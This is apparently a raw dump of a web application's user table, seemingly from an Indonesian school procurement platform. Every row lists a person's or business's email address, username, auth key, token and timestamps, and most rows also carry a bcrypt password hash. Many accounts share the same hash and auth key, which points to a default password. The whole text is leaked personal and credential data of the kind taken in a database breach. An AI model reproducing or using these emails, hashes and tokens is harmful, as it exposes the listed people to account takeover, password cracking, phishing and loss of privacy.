| 478  | NULL                 | kawanmadani@gmail.com                                | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | kawanmadani@gmail.com            | 1676090755 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 485  | NULL                 | infokotapelajar@gmail.com                            | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | infokotapelajar@gmail.com        | 1722241533 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 492  | NULL                 | konasarawoliomandiri@gmail.com                       | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | konasarawoliomandiri@gmail.com   | 1722234938 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 499  | NULL                 | lancangkuningjaya20@gmail.com                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | lancangkuningjaya20@gmail.com    | 1722241564 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 506  | NULL                 | merdekabelajar.bkl@gmail.com                         | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | merdekabelajar.bkl@gmail.com     | 1721359520 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 513  | NULL                 | merdekabelajarjogja@gmail.com                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | merdekabelajarjogja@gmail.com    | 1700721075 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 520  | NULL                 | merdekabelajar.sb@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | merdekabelajar.sb@gmail.com      | 1721359597 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 527  | NULL                 | maragaborneotarigas@gmail.com                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | maragaborneotarigas@gmail.com    | 1722234809 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 534  | NULL                 | cv.mitrablambangan@gmail.com                         | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | cv.mitrablambangan@gmail.com     | 1721359738 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 541  | NULL                 | antonsetio90@gmail.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | antonsetio90@gmail.com           | 1721358986 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 548  | NULL                 | office@mediantara-semesta.co.i                       | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | office@mediantara-semesta.co.i   | 1630374479 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 555  | NULL                 | merapimart20@gmail.com                               | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | merapimart20@gmail.com           | 1707364201 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 562  | NULL                 | mia.siplah@gmail.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | mia.siplah@gmail.com             | 1711590134 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 569  | NULL                 | musijayaampera@gmail.com                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | musijayaampera@gmail.com         | 1722241393 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 576  | NULL                 | sales.ptnt@macanan.co.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | sales.ptnt@macanan.co.id         | 1719300357 | NULL       | 1633327759 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$xsSC4kXaa8ZWdvTxN.I3Ue3YFCwzfM3QRwB/eN5wShJKs2dtHJ8pi |
| 583  | NULL                 | siplahmmg@mitraedu.co.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | siplahmmg@mitraedu.co.id         | 1630374781 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 590  | NULL                 | marimoingone20@gmail.com                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | marimoingone20@gmail.com         | 1722235010 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 597  | NULL                 | marwahbintanjaya@gmail.com                           | 2        |                                  | marwahbintanjaya@gmail.com       | 1722234897 | NULL       | 1721279079 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$QbFY6GDVrDUOx2FB3MHhheaRe3SisXvMipas8LbDbgboiZw0XVJsm |
| 604  | NULL                 | yusuf.musipelangi@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | yusuf.musipelangi@gmail.com      | 1662519077 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 611  | NULL                 | mitrapesutmahakam@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | mitrapesutmahakam@gmail.com      | 1722233829 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 618  | NULL                 | nuansabuanagemilang@yahoo.com                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | nuansabuanagemilang@yahoo.com    | NULL       | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 625  | NULL                 | nosararanosabatutu20@gmail.com                       | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | nosararanosabatutu20@gmail.com   | 1722240719 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 632  | NULL                 | pitubinangajaya@gmail.com                            | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pitubinangajaya@gmail.com        | 1722238305 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 639  | NULL                 | akuisme@percada.com                                  | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | akuisme@percada.com              | 1701827964 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 646  | NULL                 | putrakayanmandiri@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | putrakayanmandiri@gmail.com      | 1721360293 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 653  | NULL                 | pelajarboyolali08@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pelajarboyolali08@gmail.com      | 1722241248 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 660  | NULL                 | pelajarpantaiutara@gmail.com                         | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pelajarpantaiutara@gmail.com     | 1722241597 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 667  | NULL                 | pakar@pakarraya.com                                  | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pakar@pakarraya.com              | 1722240934 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 674  | NULL                 | pelajartapis.berseri10@gmail.c                       | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pelajartapis.berseri10@gmail.com | 1721359954 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 681  | NULL                 | pustaka_wikuclp@yahoo.com                            | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | pustaka_wikuclp@yahoo.com        | 1718425491 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 688  | NULL                 | ranafaras.rda@gmail.com                              | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | ranafaras.rda@gmail.com          | 1722239077 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 695  | NULL                 | rejolistrikklaten@gmail.com                          | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | rejolistrikklaten@gmail.com      | 1712126450 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 702  | NULL                 | satriolancar@yahoo.co.id                             | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | satriolancar@yahoo.co.id         | 1718425457 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 709  | NULL                 | siplahsibos@gmail.com                                | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | siplahsibos@gmail.com            | 1718425434 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 716  | NULL                 | sk.edukasi@gmail.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | sk.edukasi@gmail.com             | 1722216935 | NULL       | 1694741192 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$pMzSk4wchJAhn8JdaApnK./LD2Mzx6ZsvfBP0qd2978iptgbSQ9fO |
| 723  | NULL                 | mastiman88@ymail.com                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | mastiman88@ymail.com             | 1721361666 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 730  | NULL                 | smk@gmail.com                                        | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | smk@gmail.com                    | 1721892169 | NULL       | 1623295175 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$ziGuO4HerX1N8PB0k7sfleDhGSV00wGiUYy4KUgZ3iDJ3wq8w1b.O |
| 737  | NULL                 | sinar.N.B@gmail.com                                  | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | sinar.N.B@gmail.com              | 1722235050 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 744  | NULL                 | cvstarrisurabaya@gmail.com                           | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | cvstarrisurabaya@gmail.com       | 1722241267 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 751  | NULL                 | tunggak.jarak@gmail.com                              | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | tunggak.jarak@gmail.com          | 1722215809 | NULL       | 1686964956 | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$qhFhzx0Hy0uukM6qhBS0UOw3RXZq5xqCOAfUUnfLwfcQ5PxunOBQe |
| 758  | NULL                 | toddopulilontara@gmail.com                           | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | toddopulilontara@gmail.com       | 1722241674 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 765  | NULL                 | djantike@yahoo.co.id                                 | 2        | nITfX1Db4O693pYLBvUDU6qtrJGSlpTN | djantike@yahoo.co.id             | 1623308659 | NULL       | 0          | BtRVdCWW0XF09fWNEX5a6Eto5BbBgJeKCNNKwRQu | NULL         | $2y$13$p4FWjJd4LWtU2siqAf.eWOHOTEeWuv2VUadynAcWfaj1wFm6/Y6L6 |
| 793  | NULL                 | madesudira931@gmail.com                              | 1        | sCBi1abz0NOaIbGfBqMuXw88czBCt3CD | madesudira931@gmail.com          | 1694089183 | 0          | 1694089181 | 9AcaSzUGnlc9V8h4WKEe75S4pnqwAffQu2j8AVtE | NULL         | $2y$13$WQTX33CwqFgoiq1oCtsYOuETm5rcv69gy1eJlKE6Xv36JhGr2v7Lu |
| 828  | NULL                 | sartanti.w@gmail.com                                 | 2        | xaNPeiCIDYHWae0Ctqv3prk3J5trVq2A | sartanti.w@gmail.com             | 1652338516 | 0          | 1652338515 | BnVlbWFttY8klQNxtJPg06xprD26q2rAvGp1yV4J | NULL         | <blank>                                                      |
| 835  | NULL                 | cobacoba@gmail.com                                   | 1        | qDw4qRvOPuaJspnz4f5LEiDclhySuF-9 | adminmitracobacoba               | NULL       | 0          | 0          | WPJszFkPoa3CFzx3nznxTcleJEHzt2IzX8CfZZP1 | NULL         | $2y$13$w/EztwEXX06sHNwTAi6rhOO7ZVFkfIg9WHZUpehN810Ir6a8FoiAW |
| 841  | NULL                 | dodol@intan.com                                      | 2        | az0SDIkmSdTFjTQBqTFtrUD8GV1KhoOd | dodol                            | 1623034938 | 0          | 1623034963 | YMXYlNKpAilK84EyUPnIEerof8xU1T2lBdMQaYA4 | NULL         | $2y$13$XmC7wCQmW0aSjECs4zUot.XJ6z7cfcKOwR.R2z8X5rowpXkAdCElC |
| 848  | NULL                 | tuku@intan.com                                       | 2        | qgyuKKim9pgFve9_JeRJcBlIMo9AGHJn | tuku                             | NULL       | 0          | 0          | N_-ex36Y1212nlIf3amYdamin7NtDBtoVcdJKLbx | NULL         | $2y$13$gK7u9MknHeA6IZsEbs7bz.ZPftT.7HtesvduWf0sJ4tKLRZw.1puS |
| 849  | NULL                 | tuku01@intan.com                                     | 1        | 524zOAbAUtKRRMO2hs3CtgwMxXoqF9b9 | tuku01@intan.com                 | NULL       | 0          | 0          | sB0l15VT3vG__zQpQQISCYsQsyCQJiwzQ7rrQbpb | NULL         | $2y$13$O.2C/7KGsfrjO.M4DbxunuQ1oPa2J95FJgxV/7Pk7BrY.wnDm5wQi |
| 856  | NULL                 | lanky@gmail.com                                      | 1        | 6MXC9yBau6SS1VpuL1Xh4DvawBFFYvf- | LAnKY                            | NULL       | 0          | 0          | GmGvnoeYtn1BIWSFvQzphaMk5iBdTtssRen5bFZb | NULL         | $2y$13$YBD7mue52R0T95Ov6/uwS.llni9Kh3QqQc2po1MWNvx5HEDuvoZYW |
| 862  | NULL                 | emboha@gmail.com                                     | 1        | n1CIe_ywK3PJQcfyG1zmZ8T5UZTUlQTU | SD Emboh Abih                    | NULL       | 0          | 0          | nVgBOkLFw773HjADSCzv0mm2rZlTLmIzHnnQbzk- | NULL         | $2y$13$ZgCBbWzY9.qESAWXrNzjtOWner9jk7iO80JONFvOwpmn.NesHx/Xe |
| 863  | NULL                 | mitrajual@gmail.com                                  | 2        | m1iAbZXQpeRJZv1ePqy3KVPk0aDy9NTa | Admin mitra jual                 | NULL       | 0          | 0          | V25yWSjelXJ39UfpsO5Fi2yonKJJd3DBU9GEYlyB | NULL         | $2y$13$cfuUVNXlZrtPUBllDuI1T.XEfOQ4.lq7EEB7adIK5u3dxB8DJj0mS |
| 898  | NULL                 | anoneko@gmail.com                                    | 1        | CnMbMtZMpm6aQCklg1tifxUX5bhK-Ig_ | Anonim                           | NULL       | 0          | 0          | zfPC4e6BFgjx5bjHsZ5dw9koSlbpH8WUVvBQhEdm | NULL         | $2y$13$uaXJEaYDiowEq5eH6V5Ii.dhqaVTq2rPNo4zlwRMVQWUJkYPvWlte |
| 912  | NULL                 | ais@gmail.com                                        | 2        | XdsQhVrXWp5XZAiIQMcRAAc3z8U1xJ5W | aziz                             | NULL       | 0          | 0          | ko3Nwg88i0RzAioJmXjQ9aFExKQe3z1bXWPeq7g2 | NULL         | $2y$13$E1P7xMah/R.w0KHzADb.LOWHm.RvLh1C1eaLYQXJLomVsvp5MrSuq |
| 919  | NULL                 | paksumardi02@gmail.com                               | 2        | 1Rm6Lvy1RfS6iP7hBveW2aX0OsawXRAM | muryanto800@gmail.com            | 1625587057 | 0          | 2021       | Jy0er61maoKxCKIdrKfTE0oFtd3SBgNFDuyT10lq | NULL         | <blank>                                                      |
| 926  | NULL                 | Adminmitrabaru@gmail.com                             | 1        | 1AIbg783CaBPUkt60zmLFuGj1T-wlZmN | Adminmitrabaru                   | 1623486850 | 0          | 0          | dGj6YYelAO7sAf5Xkxb9rxW-qDUV_2vnWichUbQh | NULL         | $2y$13$vJKpBquB8hyNXB/q/WKASOL2WL9xsEV1QeIY9cP/dhjQvxy76Ot86 |
| 939  | NULL                 | Satdikbaru@gmail.com                                 | 1        | np8l1ZzIZm2KM9rsuz4AioItHFucZPii | Satdikbaru                       | NULL       | 0          | 0          | MToIC0vdyNC4Sr7k-hHlWD5EAqQbSYzNEpf8kpKy | NULL         | $2y$13$gpjsYyJyt2PC7CCq1rqOROjbJapOjeKGbwvAF3ZgV7Sp4EuKAlUCO |
| 940  | NULL                 | deviardnsss@gmail.com                                | 1        | tY-7jRxu-bPg0Yk9aO9ADYJhHM3IcXJK | deviardnddd@gmail.com            | NULL       | 0          | 0          | rYy9ojxtC_Y9IkaTXb32XXW3Yg2xuzfFDh4gwynW | NULL         | $2y$13$V5.LYkDmpmMSlfrzBGVD0uxCwLc/C36njW8QG/7r1lJkQE0Gn.un6 |
| 941  | NULL                 | deviardnxx@gmail.com                                 | 1        | ImGIIlutRhbXktO-nhX3JIv0tJlH1elc | deviardnxx@gmail.com             | NULL       | 0          | 0          | 38MRKmy9IotImmaihobpR2_p-AqD4xvDU7BGDWs9 | NULL         | $2y$13$gRbA4KoCy6P23ffou/8JreTU0zIoFZUFRU1ymBRuRHq2NLmG5yS7q |
| 942  | NULL                 | deviardnwww@gmail.com                                | 2        | zLJZbfCvhjsNpDsx73DX3doTHFkugmxX | deviardnwww@gmail.com            | 1622363808 | 0          | 0          | WitBjjyAhJSqHWyw94amGdzje_LULKwwUeODuORe | NULL         | $2y$13$93HtAqL.dBJZRC..4AMLPO/62ZfV.XEGD3zkikhS7kk.wCbKrtm0S |
| 943  | NULL                 | devardn@gmail.com                                    | 1        | PEgTkO6F5OWqL4wQRjtI6jfJTrjtQkaJ | devardn@gmail.com                | NULL       | 0          | 0          | TuQzVeHV4fLFXunubGccFFaEBMJL4d0T98GicLyW | NULL         | $2y$13$EYfqSvAQzg7AO0PKMG/OLOwpGArm4d8mg4S.cNi05VT0kCcmdo8H. |
| 944  | NULL                 | deviardnxxxxx@gmail.com                              | 2        | u8gmX9N3yEWjhh2QjMEAToEhuXdZfAnE | deviardnxxxxx@gmail.com          | 1622364369 | 0          | 0          | 9k_h__bpzMtVtNI-F4u54a8QbVkblzJq6QmhT6ov | NULL         | $2y$13$BuqDzs7dUVeJCq2Ca34XF.hLpaAM.9GnsdRgBpduYUTLCveRmg2VC |
| 945  | NULL                 | deviardnrrrrr@gmail.com                              | 2        | _EMnul6Jhu4_i2qy7AzJsyW7QJH9EeKE | deviardnrrrrr@gmail.com          | 1622364464 | 0          | 0          | aDGqItGF3Zo78WubwXX-1fkXHq9BJANuAWWYm_cH | NULL         | $2y$13$Nz8EwvX6bBtGtTwjNB6h3.2lEqrquUYqJMK8tH1FUuSOpVsDTLKfW |
| 946  | NULL                 | deviardnwwww@gmail.com                               | 1        | 2XvxvDCBW0jLrUtynoo-WMCA2Ih4cKGg | deviardnwwww@gmail.com           | NULL       | 0          | 0          | hUcRYpO1Z_IgEIX8FnjK3rimwp5x7H8Q_p2kXzkp | NULL         | $2y$13$Ocwl.Zzdh4Jzcj6C0Mt7ie8Xp.WmQOrRDFXG8ho8p.Yi3PzGVMPFu |
| 947  | NULL                 | deviardnddssssd@gmail.com                            | 1        | oCUCxR1vKjbnqTdQaIvzbxVK9K5PvcAp | deviardnddssssd@gmail.com        | NULL       | 0          | 0          | FyJP_qEhPJQNGMc326nS5JDYt_6L81OA98Kmfybm | NULL         | $2y$13$Fun6G4eut769pbq2BE2Sk.o.FPc4FLJNfqj0aMNAOvoSeBiZjdfuW |
| 948  | NULL                 | deviardnd@gmail.com                                  | 2        | tjZmQsVnfFrXKw8vZQxhT8-_XduF2p9p | deviardnd@gmail.com              | 1622364944 | 0          | 0          | E7W3cnyQYvjJOmYwZ6Q9iZ8bP64W6bP4kNWRzuQa | NULL         | $2y$13$EPZJ/430RQleUW4SllXMfeErZU9VCmEoDg1Jjl7jLMiN5HnZ6oQsW |
| 950  | NULL                 | deviardnssss@gmail.com                               | 1        | glwuiTa6NrNbKdQmKFKZ5KN4WwD8CepA | deviardnssssss@gmail.com         | 1622366287 | 0          | 0          | wLBwuFJzQBeb_IbvxLO5A6m-asbwKPV5Xz7Xkjqa | NULL         | $2y$13$cLZTP1iYYbOUDV.kIcivxOLQxBftiF5FJPowsqjHzcGG7eeMJyyjO |
| 951  | NULL                 | deviardndd@gmail.com                                 | 2        | X4VuymXnwj6K6ibSZpXfC76DPr2zY2l6 | deviardnee@gmail.com             | 1622366484 | 0          | 0          | vMO61XHZmejvBTAgtxvyq-UVcfw7eRdf3YJS5Orl | NULL         | $2y$13$mmc.IZtUKxA.Dd/1IkfWF.6zHkxo0u0wPpNzV2WAi5fw2uwhZN2Ci |
| 952  | NULL                 | pengawasNEW@gmail.com                                | 1        | udUE5fo8ROTLinVxbmJ2oaID_t5g7RJB | pengawasNEW                      | 1622630258 | 0          | 0          | 8kPUjilDwTIOFTe0UncUYTdYJX_6FVZKRXu3ipk0 | NULL         | $2y$13$f6OeINPpOzXHl/2fslzEOuZo2Wh4SqYbBS/phHI2EufDU4p3Mde.S |
| 960  | NULL                 | rianasusanti63@gmail.com                             | 1        | e9T_MAZYEVoly2iuCZAwWLdGutdku8As | Pengawas Riana                   | 1624249238 | 0          | 1624249171 | F5bnYaNaVHRwWYuxMY5ZXU60xLf49vU3FDurWgyc | NULL         | $2y$13$4.hYJs0NGtf4vJxQvx7r2uRFcgt9h5m.9XQwKorQs7FGqr1RoyEN. |
| 961  | NULL                 | Ommariadyah@gmail.com                                | 1        | 7_amF5Tq_8Qu_r7fPe8JfSn3ttfBzPfa | Pengawass                        | 1622622231 | 0          | 0          | 6X-vzKy7vktYdr8vhZyFu0akkyWH38nAzIjVd8zH | NULL         | $2y$13$liMCfZuup/2jksO083/vIeUnH.wtAAYgcV83rWvTw8jWipmhJVC9a |
| 967  | NULL                 | azis.gabs@gmail.com                                  | 2        | TvGEyYStvcFBdqAOhyeN43i_xZB1sDvH | setyawan                         | 1622639765 | 0          | 0          | MQZ5nTsA4TFUhMtlp_DiwBS0MBsGbpBks3b7uhVS | NULL         | $2y$13$RVRidGkAn023VdFjQ3FK2O4tagq7gg6uX4UWTtm2eiLfVYHDjGhNS |
| 968  | NULL                 | pengpeng@gmail.com                                   | 1        | cmDFnw4EdnGn2ZnA_lYqy3Lvoux0U_XQ | pengpeng                         | 1623997853 | 0          | 0          | GgEtA6vs_OCUQ_rilixzL65MynKAiNQetj9h66IA | NULL         | $2y$13$s6W9a6NDdk6RJcXxAeIFre9SsSig/wxut1OGiXkp3UlfdBFgTGI9u |
| 971  | NULL                 | adminMitratest@mail.com                              | 2        | e_yb-5oflTvYgDLRuEH-KdoOiczE7O04 | sekolah01                        | NULL       | 0          | 0          | 7esIkTrxdJwA8zZcOGhIjD6zSJTNYOTOQq-0fi8J | NULL         | $2y$13$PZB6tJLj3Jirt40MNoZDVOq4f5c6nXwS8RH87KqEMJTzjNL.08l0. |
| 972  | NULL                 | awaslho@mail.com                                     | 1        | SECdZTUAT5velGi7dsJLonDZYJzDKoli | awaslho                          | 1622650583 | 0          | 0          | O0AspHSgA1mof456n3TlZViUoX-bAcFLIGRd7h-m | NULL         | $2y$13$0qP7ZFhdO4l/sLhRKUqHSexsNh1cg8czpzpPTA4svH9GfWz/XbSxa |
| 974  | NULL                 | syafii4smk3@gmail.com                                | 2        | qcKBp27amoCwQNckesKbNldGeg7marrs | heriistyowati250@gmail.com       | 1622673946 | 0          | 0          | LDTzWt9nbU0epzMZLz6iHYBf3lAIo6bvTbrPBeVj | NULL         | <blank>                                                      |
| 976  | NULL                 | haryanieliabet@gmail.com                             | 1        | UMliES6V7zwMO4qSJmy5ITCYRKpCJIB3 | haryanieliabet@gmail.com         | 1698316898 | 0          | 1698316896 | s0hJ8GkT4w3X6LezDpdod4xx7vSZErLkEDPqYNER | NULL         | $2y$13$uWZF3ZrswY6Zq9T9KvaLKOtqI6DigVRthYJLMc6q3hTjd3T7b1vla |
| 979  | NULL                 | warsonocangkos@gmail.com                             | 1        | UVztJPmBGGVrqfHf4KizxazPnRMAqZ8P | bendahara01@datadik.id           | 1659496129 | 0          | 1659496128 | 0RyQnLmYtkFmnEvtS9R7xQI9BTjfbpTowpbiOOfK | NULL         | $2y$13$MdSZdnoUJZ2xHigh20tcme4yA.mtCU3.mjNW9HDC8sOoLDF60Z32y |
